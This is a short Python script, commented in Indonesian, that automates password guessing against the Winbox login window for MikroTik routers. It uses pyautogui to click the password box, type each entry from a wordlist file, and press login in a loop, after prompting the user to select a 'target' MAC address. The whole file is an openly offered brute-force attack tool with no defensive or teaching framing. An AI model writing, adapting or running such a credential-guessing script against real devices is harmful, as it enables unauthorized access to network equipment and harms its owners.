import pyautogui
import time

# ---------- SETUP POSISI ----------
# Ganti koordinat ini sesuai dengan posisi kotak password dan tombol login di Winbox
password_box_pos = (179, 144)  # Ubah sesuai hasil pyautogui.position()
login_button_pos = (1680, 198)  # Ubah sesuai tombol login
# ----------------------------------

# Delay awal untuk memberi waktu kamu membuka Winbox secara manual
print("[*] Silakan buka Winbox dan pilih MAC address target...")
time.sleep(5)

# Baca wordlist
with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()

# Loop semua password
for password in passwords:
    print(f"[+] Mencoba password: {password}")

    # Klik kolom password
    pyautogui.click(password_box_pos)
    time.sleep(0.5)

    # Hapus password sebelumnya
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.press('backspace')

    # Ketik password baru
    pyautogui.write(password)
    time.sleep(0.5)

    # Klik tombol login
    pyautogui.click(login_button_pos)

    # Tunggu respon (misal muncul pesan gagal login)
    time.sleep(4)

print("[✓] Selesai mencoba semua password.")
